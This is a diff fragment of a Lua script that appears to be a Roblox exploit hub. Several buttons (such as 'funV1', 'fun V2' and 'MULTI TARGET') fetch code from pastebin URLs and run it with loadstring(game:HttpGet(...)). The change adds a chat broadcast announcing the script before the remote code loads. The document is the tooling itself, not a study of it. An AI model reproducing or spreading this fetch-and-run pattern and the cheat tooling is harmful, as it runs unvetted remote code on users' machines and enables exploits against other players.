@@ -2272,7 +2272,27 @@ btn("🎵 DJ PLAYER",P7,function()
 	))()
 end)
 
-btn("funV1 💀", P6, function() loadstring(game:HttpGet("https://pastebin.com/raw/Gk24KYmb"))() end)
+
+btn("funV1 💀", P6, function() 
+local message = "SCRIPT BY " .. playerName
+    .. " ___________________________________________ "
+    .. "BANG 💥"
+    .. " made by " .. playerName
+    .. " loaded..👀"
+
+local channel = game:GetService("TextChatService")
+    :FindFirstChild("TextChannels")
+
+channel = channel and channel:FindFirstChild("RBXGeneral")
+
+if channel then
+    pcall(function()
+        channel:SendAsync(message)
+    end)
+		end		
+		
+loadstring(game:HttpGet("https://pastebin.com/raw/Gk24KYmb"))() end)
+
 btn("fun V2💀", P6, function() loadstring(game:HttpGet("https://pastebin.com/raw/X73d41m6"))() end)
 btn("fun 3 💀", P6, function() loadstring(game:HttpGet("https://pastebin.com/raw/TsLFDeKw"))() end)
 btn("MULTI TARGET 💥🕷️", P6, function() loadstring(game:HttpGet("https://pastebin.com/raw/6f0Kfemd"))() end)
